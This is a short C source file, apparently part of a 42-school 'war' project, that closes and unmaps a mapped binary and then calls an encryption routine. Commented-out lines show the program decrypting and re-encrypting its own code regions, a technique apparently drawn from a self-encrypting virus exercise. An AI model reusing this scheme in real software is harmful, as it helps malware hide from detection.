/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   release.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/01 18:08:20 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void		release(t_data *data)
{

	/* revert_two(&data->key, (char*)inject, (size_t)release - (size_t)inject); */

#ifdef DEBUG
	char de[] = "release\t \n";
	data->context == true ?	de[8] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	if (data->context == true || data->context == false)
	{
		_close(data->bin.fd);
		_munmap(data->bin.map, data->bin.size);
	}

	/* update_two(&data->key, (char*)release, (size_t)cypher_end - (size_t)release); */
	/* revert_two(&data->key, (char*)cypher_end, (size_t)end - (size_t)release); */

	cypher_end(data);
}
